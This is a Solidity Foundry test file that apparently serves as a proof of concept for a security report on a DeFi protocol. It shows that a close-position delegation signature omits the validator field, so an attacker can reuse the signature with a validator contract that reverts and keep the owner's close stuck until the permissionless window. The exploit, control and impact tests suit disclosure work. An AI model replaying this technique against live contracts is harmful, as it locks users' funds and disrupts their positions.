// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import { DelegationSignatureUtils } from "../test/utils/DelegationSignatureUtils.sol";
import { UsdnProtocolBaseFixture } from "../test/unit/UsdnProtocol/utils/Fixtures.sol";

contract RevertingValidator {
    receive() external payable {
        revert("reject ether");
    }
}

/**
 * @notice PoC for validator malleability in delegated initiateClosePosition.
 *
 * The EIP-712 close delegation binds positionCloser=msg.sender but does NOT bind validator.
 * When the shared Universal Router is the positionCloser, any external caller able to copy the
 * Router-bound signature can submit the same delegation through the same Router while replacing
 * the validator. A reverting validator makes the normal validateClosePosition path revert when
 * the protocol tries to refund the security deposit to that validator. Recovery is possible only
 * once the action becomes permissionlessly actionable.
 */
contract TestCloseDelegationValidatorMalleability is UsdnProtocolBaseFixture, DelegationSignatureUtils {
    uint256 internal constant OWNER_PK = 0xA11CE;
    uint128 internal constant POSITION_AMOUNT = 1 ether;

    address internal owner;
    address internal honestValidator = address(0xBEEF);
    RevertingValidator internal attackerValidator;
    PositionId internal posId;
    bytes internal priceData;
    bytes internal routerBoundSignature;
    uint256 internal securityDeposit;
    uint256 internal deadline;

    function setUp() public {
        SetUpParams memory setupParams = DEFAULT_PARAMS;
        setupParams.flags.enableSecurityDeposit = true;
        _setUp(setupParams);

        owner = vm.addr(OWNER_PK);
        attackerValidator = new RevertingValidator();
        priceData = abi.encode(params.initialPrice);
        deadline = type(uint256).max;
        securityDeposit = protocol.getSecurityDepositValue();
        require(securityDeposit > 0, "security deposit must be enabled");

        posId = setUpUserPositionInLong(
            OpenParams({
                user: owner,
                untilAction: ProtocolAction.ValidateOpenPosition,
                positionSize: POSITION_AMOUNT,
                desiredLiqPrice: params.initialPrice - (params.initialPrice / 5),
                price: params.initialPrice
            })
        );

        InitiateClosePositionDelegation memory delegation = InitiateClosePositionDelegation({
            posIdHash: keccak256(abi.encode(posId)),
            amountToClose: POSITION_AMOUNT,
            userMinPrice: DISABLE_MIN_PRICE,
            to: owner,
            deadline: deadline,
            positionOwner: owner,
            // address(this) models the Universal Router: Protocol sees the Router as msg.sender
            // regardless of which external account called Router.execute().
            positionCloser: address(this),
            nonce: protocol.getNonce(owner)
        });
        routerBoundSignature = _getDelegationSignature(OWNER_PK, protocol.domainSeparatorV4(), delegation);

        vm.deal(address(this), 10 ether);
        vm.deal(owner, 1 ether);
    }

    function _initiateWithValidator(address payable validator) internal {
        protocol.initiateClosePosition{ value: securityDeposit }(
            posId,
            POSITION_AMOUNT,
            DISABLE_MIN_PRICE,
            owner,
            validator,
            deadline,
            priceData,
            EMPTY_PREVIOUS_DATA,
            routerBoundSignature
        );
    }

    /// @dev Control: the owner's Router-bound signature works with the intended validator.
    function test_control_signatureAcceptsHonestValidator() public {
        _initiateWithValidator(payable(honestValidator));

        LongPendingAction memory action =
            protocol.i_toLongPendingAction(protocol.getUserPendingAction(honestValidator));
        assertEq(action.validator, honestValidator, "honest validator should own pending action");
        assertEq(action.to, owner, "signed recipient must remain owner");
        assertEq(protocol.getNonce(owner), 1, "delegation nonce consumed");
    }

    /// @dev Exploit: exact same signature also works after replacing the unsigned validator.
    function test_sameSignatureAcceptsAttackerChosenValidator() public {
        _initiateWithValidator(payable(address(attackerValidator)));

        LongPendingAction memory action =
            protocol.i_toLongPendingAction(protocol.getUserPendingAction(address(attackerValidator)));
        assertEq(action.validator, address(attackerValidator), "attacker chose validator without owner signature");
        assertEq(action.to, owner, "attacker cannot change signed recipient");
        assertEq(protocol.getNonce(owner), 1, "owner nonce consumed by attacker-submitted close");
    }

    /// @dev Impact: normal validation reverts on ETH refund to malicious validator; only the later
    /// permissionless path can clear the action and recover the close.
    function test_revertingValidatorForcesPendingCloseUntilPermissionlessWindow() public {
        _initiateWithValidator(payable(address(attackerValidator)));

        (PendingAction memory pending, uint128 rawIndex) = protocol.i_getPendingAction(address(attackerValidator));
        assertEq(pending.validator, address(attackerValidator), "pending action keyed by attacker validator");

        uint256 initiatedAt = pending.timestamp;
        uint256 lowLatencyDeadline = protocol.getLowLatencyValidatorDeadline();
        uint256 lowLatencyDelay = oracleMiddleware.getLowLatencyDelay();
        emit log_named_uint("EVIDENCE_security_deposit_wei", securityDeposit);
        emit log_named_uint("EVIDENCE_low_latency_validator_deadline_seconds", lowLatencyDeadline);
        emit log_named_uint("EVIDENCE_low_latency_oracle_delay_seconds", lowLatencyDelay);
        emit log_named_uint("EVIDENCE_pending_timestamp", initiatedAt);
        emit log_named_address("EVIDENCE_attacker_validator", address(attackerValidator));

        // At T+25s the close is normally validatable with the Pyth-style low-latency price.
        vm.warp(initiatedAt + 25 seconds);
        vm.prank(owner);
        vm.expectRevert(UsdnProtocolEtherRefundFailed.selector);
        protocol.validateClosePosition(payable(address(attackerValidator)), priceData, EMPTY_PREVIOUS_DATA);

        // The revert is atomic: owner has still received nothing and the pending action remains.
        assertEq(wstETH.balanceOf(owner), 0, "normal validation was rolled back");
        PendingAction memory stillPending = protocol.getUserPendingAction(address(attackerValidator));
        assertEq(stillPending.timestamp, pending.timestamp, "pending close remains stuck");

        bytes[] memory previousPriceData = new bytes[](1);
        previousPriceData[0] = priceData;
        uint128[] memory rawIndices = new uint128[](1);
        rawIndices[0] = rawIndex;
        PreviousActionsData memory previous =
            PreviousActionsData({ priceData: previousPriceData, rawIndices: rawIndices });

        // At the exact validator deadline the action is still not permissionlessly actionable (`>` check).
        vm.warp(initiatedAt + lowLatencyDeadline);
        vm.prank(owner);
        uint256 validatedAtBoundary = protocol.validateActionablePendingActions(previous, 1);
        assertEq(validatedAtBoundary, 0, "must not be permissionless at exact boundary");
        assertEq(wstETH.balanceOf(owner), 0, "owner still locked at boundary");

        // One second later it becomes permissionless. This path does not refund the malicious
        // designated validator, so the owner can finally recover the close and claims attacker's deposit.
        vm.warp(initiatedAt + lowLatencyDeadline + 1);
        uint256 ethBefore = owner.balance;
        vm.prank(owner);
        uint256 validated = protocol.validateActionablePendingActions(previous, 1);

        assertEq(validated, 1, "permissionless validation must recover pending close");
        assertGt(wstETH.balanceOf(owner), 0, "owner finally receives close payout");
        assertEq(owner.balance, ethBefore + securityDeposit, "actual validator receives attacker-funded deposit");
        assertEq(
            uint256(protocol.getUserPendingAction(address(attackerValidator)).action),
            uint256(ProtocolAction.None),
            "pending action cleared"
        );

        emit log_named_uint("EVIDENCE_forced_lock_seconds", lowLatencyDeadline - 25 seconds + 1);
        emit log_named_uint("EVIDENCE_owner_asset_received_after_recovery", wstETH.balanceOf(owner));
        emit log_named_uint("EVIDENCE_owner_security_deposit_reward", owner.balance - ethBefore);
    }
}
